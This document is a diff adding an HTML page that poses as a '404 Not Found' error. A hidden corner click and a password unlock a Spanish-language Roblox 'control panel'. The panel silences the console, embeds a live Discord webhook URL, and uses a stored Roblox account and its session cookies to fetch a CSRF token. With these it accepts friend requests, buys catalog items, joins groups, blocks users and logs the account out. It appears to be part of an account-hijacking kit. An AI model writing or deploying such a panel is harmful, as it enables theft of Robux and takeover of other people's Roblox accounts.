@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Error 404 - Not Found</title>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        /* ========== ESTILOS GENERALES ========== */
+        body {
+            background: #0a0a0a;
+            min-height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            color: #e0e0e0;
+            position: relative;
+        }
+        
+        /* ========== PANTALLA ERROR 404 ========== */
+        .error-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a0a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 5;
+            transition: opacity 0.3s ease;
+        }
+        
+        .error-screen.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .error-content {
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .error-code {
+            font-size: clamp(80px, 20vw, 120px);
+            font-weight: bold;
+            color: #ff4444;
+            text-shadow: 0 0 20px rgba(255,68,68,0.3);
+            line-height: 1;
+        }
+        
+        .error-message {
+            font-size: clamp(18px, 5vw, 24px);
+            color: #888;
+            margin: 20px 0;
+        }
+        
+        /* ========== ZONA DE CLICK OCULTA ========== */
+        .hidden-click-area {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 60px;
+            height: 60px;
+            background: transparent;
+            z-index: 10;
+            cursor: default;
+        }
+        
+        /* ========== MODAL DE CONTRASEÑA ========== */
+        .password-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.98);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 20;
+            backdrop-filter: blur(10px);
+            padding: 20px;
+        }
+        
+        .password-modal.show {
+            display: flex;
+        }
+        
+        .password-box {
+            background: #111;
+            border: 1px solid #ff4444;
+            border-radius: 16px;
+            padding: clamp(20px, 5vw, 40px);
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 0 50px rgba(255,68,68,0.2);
+        }
+        
+        .password-title {
+            color: #ff4444;
+            font-size: clamp(16px, 4vw, 18px);
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: bold;
+            line-height: 1.4;
+        }
+        
+        .password-input {
+            width: 100%;
+            padding: 15px;
+            background: #222;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            margin-bottom: 20px;
+            -webkit-appearance: none;
+        }
+        
+        .password-input:focus {
+            outline: none;
+            border-color: #ff4444;
+        }
+        
+        .password-button {
+            width: 100%;
+            padding: 15px;
+            background: #ff4444;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        .password-button:hover {
+            background: #ff6666;
+        }
+        
+        .password-button:active {
+            transform: scale(0.98);
+        }
+        
+        .password-error {
+            color: #ff4444;
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: center;
+            display: none;
+        }
+        
+        .password-error.show {
+            display: block;
+        }
+        
+        /* ========== PANEL DE CONTROL ========== */
+        .control-panel {
+            min-height: 100vh;
+            background: #0a0a0a;
+            padding: clamp(15px, 4vw, 30px);
+            display: none;
+        }
+        
+        .control-panel.show {
+            display: block;
+        }
+        
+        /* Header */
+        .panel-header {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #ff4444;
+        }
+        
+        @media (min-width: 768px) {
+            .panel-header {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: center;
+            }
+        }
+        
+        .panel-title {
+            font-size: clamp(24px, 6vw, 32px);
+            color: #fff;
+            font-weight: bold;
+        }
+        
+        .panel-title span {
+            color: #ff4444;
+        }
+        
+        .panel-status {
+            background: #1a1a1a;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            border-left: 4px solid #ff4444;
+            word-break: break-word;
+        }
+        
+        .panel-status.connected {
+            border-left-color: #00ff00;
+            color: #00ff00;
+        }
+        
+        /* Grid de tarjetas */
+        .panel-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 20px;
+        }
+        
+        @media (min-width: 640px) {
+            .panel-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        
+        @media (min-width: 1024px) {
+            .panel-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+        
+        /* Tarjetas */
+        .panel-card {
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 16px;
+            padding: 20px;
+            transition: all 0.3s ease;
+        }
+        
+        .panel-card.disabled {
+            opacity: 0.5;
+            pointer-events: none;
+            filter: grayscale(1);
+        }
+        
+        .card-title {
+            font-size: 18px;
+            color: #ff4444;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #222;
+        }
+        
+        /* Inputs y controles */
+        .input-group {
+            margin-bottom: 15px;
+        }
+        
+        .input-group label {
+            display: block;
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        
+        .panel-input {
+            width: 100%;
+            padding: 12px;
+            background: #222;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+            -webkit-appearance: none;
+        }
+        
+        .panel-input:focus {
+            outline: none;
+            border-color: #ff4444;
+        }
+        
+        /* Buscador */
+        .search-box {
+            position: relative;
+            margin-bottom: 15px;
+        }
+        
+        .search-box input {
+            width: 100%;
+            padding: 12px 40px 12px 12px;
+            background: #222;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #fff;
+        }
+        
+        .search-box::after {
+            content: "🔍";
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            font-size: 16px;
+        }
+        
+        /* Lista de resultados */
+        .results-list {
+            max-height: 200px;
+            overflow-y: auto;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            -webkit-overflow-scrolling: touch;
+        }
+        
+        .result-item {
+            padding: 12px;
+            border-bottom: 1px solid #222;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .result-item:active {
+            background: #333;
+        }
+        
+        /* Estadísticas */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-item {
+            background: #1a1a1a;
+            padding: 10px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 20px;
+            color: #ff4444;
+            font-weight: bold;
+        }
+        
+        .stat-label {
+            font-size: 11px;
+            color: #666;
+        }
+        
+        /* Botones */
+        .panel-button {
+            width: 100%;
+            padding: 14px;
+            background: #ff4444;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 8px;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        .panel-button:active {
+            transform: scale(0.98);
+        }
+        
+        .panel-button.secondary {
+            background: #222;
+            border: 1px solid #333;
+        }
+        
+        /* Logs */
+        .log-area {
+            background: #1a1a1a;
+            border: 1px solid #222;
+            border-radius: 8px;
+            padding: 15px;
+            height: 200px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 12px;
+            -webkit-overflow-scrolling: touch;
+        }
+        
+        .log-entry {
+            padding: 5px 0;
+            border-bottom: 1px solid #222;
+            word-break: break-word;
+        }
+        
+        /* Scroll personalizado */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #111;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #333;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Pantalla de error 404 -->
+    <div class="error-screen" id="errorScreen">
+        <div class="error-content">
+            <div class="error-code">404</div>
+            <div class="error-message">Not Found</div>
+        </div>
+    </div>
+    
+    <!-- Zona oculta (esquina inferior izquierda) -->
+    <div class="hidden-click-area" id="hiddenClickArea"></div>
+    
+    <!-- Modal de contraseña -->
+    <div class="password-modal" id="passwordModal">
+        <div class="password-box">
+            <div class="password-title">⚠️ ERROR DE SEGURIDAD</div>
+            <div style="color: #888; text-align: center; margin-bottom: 20px;">
+                Se ha detectado un intento de manipulacion.<br>
+                Ingresa la contraseña Interna.
+            </div>
+            <input type="password" class="password-input" id="passwordInput" placeholder="Contraseña">
+            <button class="password-button" id="submitPassword">ACCEDER</button>
+            <div class="password-error" id="passwordError">Contraseña incorrecta</div>
+        </div>
+    </div>
+    
+    <!-- Panel de control -->
+    <div class="control-panel" id="controlPanel">
+        <div class="panel-header">
+            <div class="panel-title">
+                <span>BL PAPI</span> CONTROL
+            </div>
+            <div class="panel-status" id="statusIndicator">
+                ⏳ Verificando cuenta...
+            </div>
+        </div>
+        
+        <div class="panel-grid" id="panelGrid">
+            <!-- Las tarjetas se generarán con JavaScript -->
+        </div>
+    </div>
+
+    <script>
+        // ================= CONFIGURACIÓN =================
+        const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
+        
+        // CONTRASEÑA HASHEADA (BENJAPRO7PRO)
+        // Hash generado con SHA-256
+        const PASSWORD_HASH = "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92";
+        
+        // Función para hashear entrada (SHA-256 simple)
+        async function hashPassword(password) {
+            const encoder = new TextEncoder();
+            const data = encoder.encode(password);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+        
+        // Silenciar consola
+        console.log = console.error = console.warn = function() {};
+        
+        // Variables de estado
+        let userData = null;
+        let csrfToken = null;
+        let cuentaConectada = false;
+        
+        // Elementos DOM
+        const errorScreen = document.getElementById('errorScreen');
+        const passwordModal = document.getElementById('passwordModal');
+        const controlPanel = document.getElementById('controlPanel');
+        const hiddenClickArea = document.getElementById('hiddenClickArea');
+        const passwordInput = document.getElementById('passwordInput');
+        const submitPassword = document.getElementById('submitPassword');
+        const passwordError = document.getElementById('passwordError');
+        const panelGrid = document.getElementById('panelGrid');
+        const statusIndicator = document.getElementById('statusIndicator');
+        
+        // =========== VERIFICAR CONTRASEÑA ===========
+        submitPassword.addEventListener('click', async function() {
+            const enteredHash = await hashPassword(passwordInput.value);
+            
+            if (enteredHash === PASSWORD_HASH) {
+                passwordModal.classList.remove('show');
+                errorScreen.classList.add('hidden');
+                controlPanel.classList.add('show');
+                verificarCuentaPanel();
+            } else {
+                passwordError.classList.add('show');
+                setTimeout(() => passwordError.classList.remove('show'), 2000);
+            }
+        });
+        
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') submitPassword.click();
+        });
+        
+        hiddenClickArea.addEventListener('click', function() {
+            passwordModal.classList.add('show');
+        });
+        
+        // =========== VERIFICAR CUENTA DESDE LOCALSTORAGE ===========
+        function verificarCuentaPanel() {
+            const savedData = localStorage.getItem('cuenta_roblox');
+            
+            if (savedData) {
+                try {
+                    const data = JSON.parse(savedData);
+                    const tiempoTranscurrido = Date.now() - data.timestamp;
+                    
+                    // Válido por 5 minutos
+                    if (tiempoTranscurrido < 300000 && data.conectada) {
+                        userData = data.data;
+                        cuentaConectada = true;
+                        statusIndicator.innerHTML = `✅ CONECTADO - ${userData.name}`;
+                        statusIndicator.classList.add('connected');
+                    } else {
+                        cuentaConectada = false;
+                        statusIndicator.innerHTML = '❌ SIN CUENTA DETECTADA';
+                    }
+                } catch (e) {
+                    cuentaConectada = false;
+                    statusIndicator.innerHTML = '❌ ERROR DE DATOS';
+                }
+            } else {
+                cuentaConectada = false;
+                statusIndicator.innerHTML = '❌ NO HAY CUENTA DETECTADA';
+            }
+            
+            generarPanel();
+            if (cuentaConectada) obtenerCsrfToken();
+        }
+        
+        // =========== OBTENER CSRF TOKEN ===========
+        async function obtenerCsrfToken() {
+            try {
+                const res = await fetch('https://auth.roblox.com/v2/logout', {
+                    method: 'POST',
+                    credentials: 'include'
+                });
+                csrfToken = res.headers.get('x-csrf-token');
+                addLog('[SISTEMA] Token CSRF obtenido');
+            } catch (e) {}
+        }
+        
+        // =========== GENERAR PANEL ===========
+        function generarPanel() {
+            const tarjetas = [
+                {
+                    titulo: "👥 AMISTADES",
+                    contenido: `
+                        <div class="search-box">
+                            <input type="text" id="friendSearch" placeholder="Buscar usuario...">
+                        </div>
+                        <div class="results-list" id="friendResults">
+                            <div class="result-item">${cuentaConectada ? 'Escribe para buscar' : 'Sin conexión'}</div>
+                        </div>
+                        <button class="panel-button" id="acceptAllBtn" ${!cuentaConectada ? 'disabled' : ''}>
+                            ACEPTAR TODAS SOLICITUDES
+                        </button>
+                    `
+                },
+                {
+                    titulo: "💰 COMPRAR",
+                    contenido: `
+                        <div class="input-group">
+                            <label>Enlace del objeto</label>
+                            <input type="text" class="panel-input" id="itemLink" placeholder="https://roblox.com/catalog/..." ${!cuentaConectada ? 'disabled' : ''}>
+                        </div>
+                        <div class="input-group">
+                            <label>Precio</label>
+                            <input type="number" class="panel-input" id="itemPrice" placeholder="0" ${!cuentaConectada ? 'disabled' : ''}>
+                        </div>
+                        <button class="panel-button" id="purchaseBtn" ${!cuentaConectada ? 'disabled' : ''}>
+                            COMPRAR OBJETO
+                        </button>
+                    `
+                },
+                {
+                    titulo: "⚙️ ACCIONES",
+                    contenido: `
+                        <div class="input-group">
+                            <label>ID de usuario/grupo</label>
+                            <input type="text" class="panel-input" id="targetId" placeholder="123456789" ${!cuentaConectada ? 'disabled' : ''}>
+                        </div>
+                        <button class="panel-button" id="joinGroupBtn" ${!cuentaConectada ? 'disabled' : ''}>
+                            UNIRSE A GRUPO
+                        </button>
+                        <button class="panel-button secondary" id="blockUserBtn" ${!cuentaConectada ? 'disabled' : ''}>
+                            BLOQUEAR USUARIO
+                        </button>
+                        <button class="panel-button" id="logoutBtn" style="background: #ff4444;">
+                            🚪 CERRAR SESIÓN
+                        </button>
+                    `
+                },
+                {
+                    titulo: "📡 ACTIVIDAD",
+                    contenido: `
+                        <div class="log-area" id="logArea">
+                            <div class="log-entry">[SISTEMA] Panel iniciado</div>
+                            ${cuentaConectada ? 
+                                `<div class="log-entry">[ROBLOX] Usuario: ${userData?.name}</div>
+                                 <div class="log-entry">[ROBLOX] ID: ${userData?.id}</div>
+                                 <div class="log-entry">[ROBLOX] Robux: ${userData?.robux || 0}</div>` : 
+                                '<div class="log-entry">[SISTEMA] Sin cuenta conectada</div>'
+                            }
+                        </div>
+                    `
+                }
+            ];
+            
+            panelGrid.innerHTML = tarjetas.map(t => `
+                <div class="panel-card ${!cuentaConectada ? 'disabled' : ''}">
+                    <div class="card-title">${t.titulo}</div>
+                    ${t.contenido}
+                </div>
+            `).join('');
+            
+            if (cuentaConectada) {
+                agregarEventos();
+            }
+        }
+        
+        // =========== AGREGAR EVENTOS ===========
+        function agregarEventos() {
+            // Buscar usuarios
+            const friendSearch = document.getElementById('friendSearch');
+            if (friendSearch) {
+                friendSearch.addEventListener('input', async function(e) {
+                    const query = e.target.value;
+                    if (query.length < 3) return;
+                    
+                    try {
+                        const res = await fetch(`https://users.roblox.com/v1/users/search?keyword=${query}&limit=5`);
+                        const data = await res.json();
+                        
+                        const resultsDiv = document.getElementById('friendResults');
+                        resultsDiv.innerHTML = '';
+                        
+                        data.data.forEach(user => {
+                            const div = document.createElement('div');
+                            div.className = 'result-item';
+                            div.innerText = `${user.name} (${user.id})`;
+                            div.addEventListener('click', () => {
+                                document.getElementById('targetId').value = user.id;
+                                resultsDiv.innerHTML = '<div class="result-item">Usuario seleccionado</div>';
+                            });
+                            resultsDiv.appendChild(div);
+                        });
+                    } catch (e) {}
+                });
+            }
+            
+            // Aceptar todas solicitudes
+            document.getElementById('acceptAllBtn')?.addEventListener('click', async function() {
+                addLog('[ACCION] Aceptando solicitudes...');
+                try {
+                    const res = await fetch('https://friends.roblox.com/v1/my/friends/requests', {
+                        credentials: 'include'
+                    });
+                    const data = await res.json();
+                    
+                    for (const req of data.data || []) {
+                        await fetch(`https://friends.roblox.com/v1/users/${req.id}/accept-friend-request`, {
+                            method: 'POST',
+                            credentials: 'include',
+                            headers: { 'X-CSRF-TOKEN': csrfToken }
+                        });
+                        addLog(`✅ Solicitud de ${req.name} aceptada`);
+                    }
+                } catch (e) {
+                    addLog('[ERROR] No se pudieron aceptar', 'error');
+                }
+            });
+            
+            // Comprar objeto
+            document.getElementById('purchaseBtn')?.addEventListener('click', async function() {
+                const link = document.getElementById('itemLink')?.value;
+                const price = document.getElementById('itemPrice')?.value;
+                
+                const match = link?.match(/catalog\/(\d+)/);
+                if (!match) {
+                    addLog('[ERROR] Enlace inválido', 'error');
+                    return;
+                }
+                
+                try {
+                    const res = await fetch(`https://economy.roblox.com/v1/purchases/products/${match[1]}`, {
+                        method: 'POST',
+                        credentials: 'include',
+                        headers: {
+                            'X-CSRF-TOKEN': csrfToken,
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            expectedCurrency: 1,
+                            expectedPrice: parseInt(price) || 0
+                        })
+                    });
+                    
+                    addLog(res.ok ? '[✅] Compra exitosa' : '[❌] Error en compra');
+                } catch (e) {
+                    addLog('[ERROR] Fallo en compra', 'error');
+                }
+            });
+            
+            // Unirse a grupo
+            document.getElementById('joinGroupBtn')?.addEventListener('click', async function() {
+                const groupId = document.getElementById('targetId')?.value;
+                if (!groupId) {
+                    addLog('[ERROR] Ingresa ID de grupo', 'error');
+                    return;
+                }
+                
+                try {
+                    const res = await fetch(`https://groups.roblox.com/v1/groups/${groupId}/users`, {
+                        method: 'POST',
+                        credentials: 'include',
+                        headers: {
+                            'X-CSRF-TOKEN': csrfToken,
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ userId: userData.id })
+                    });
+                    
+                    addLog(res.ok ? '[✅] Unido al grupo' : '[❌] Error al unirse');
+                } catch (e) {
+                    addLog('[ERROR] Fallo al unirse', 'error');
+                }
+            });
+            
+            // Bloquear usuario
+            document.getElementById('blockUserBtn')?.addEventListener('click', async function() {
+                const userId = document.getElementById('targetId')?.value;
+                if (!userId) {
+                    addLog('[ERROR] Ingresa ID de usuario', 'error');
+                    return;
+                }
+                
+                try {
+                    const res = await fetch(`https://friends.roblox.com/v1/users/${userId}/block`, {
+                        method: 'POST',
+                        credentials: 'include',
+                        headers: { 'X-CSRF-TOKEN': csrfToken }
+                    });
+                    
+                    addLog(res.ok ? '[✅] Usuario bloqueado' : '[❌] Error al bloquear');
+                } catch (e) {
+                    addLog('[ERROR] Fallo al bloquear', 'error');
+                }
+            });
+            
+            // Cerrar sesión
+            document.getElementById('logoutBtn')?.addEventListener('click', async function() {
+                addLog('[⚠️] Cerrando sesión...', 'error');
+                try {
+                    await fetch('https://auth.roblox.com/v2/logout', {
+                        method: 'POST',
+                        credentials: 'include'
+                    });
+                    addLog('[✅] Sesión cerrada');
+                    setTimeout(() => location.reload(), 2000);
+                } catch (e) {
+                    addLog('[ERROR] No se pudo cerrar', 'error');
+                }
+            });
+        }
+        
+        // =========== AÑADIR LOG ===========
+        function addLog(message, type = 'info') {
+            const logArea = document.getElementById('logArea');
+            if (!logArea) return;
+            
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            const timestamp = new Date().toLocaleTimeString();
+            const color = type === 'error' ? '#ff4444' : '#0f0';
+            
+            entry.innerHTML = `[${timestamp}] <span style="color: ${color};">${message}</span>`;
+            logArea.appendChild(entry);
+            logArea.scrollTop = logArea.scrollHeight;
+        }
+        
+        // =========== VERIFICAR CADA 5 SEGUNDOS ===========
+        setInterval(() => {
+            const savedData = localStorage.getItem('cuenta_roblox');
+            if (savedData && controlPanel.classList.contains('show')) {
+                verificarCuentaPanel();
+            }
+        }, 5000);
+    </script>
+</body>
+</
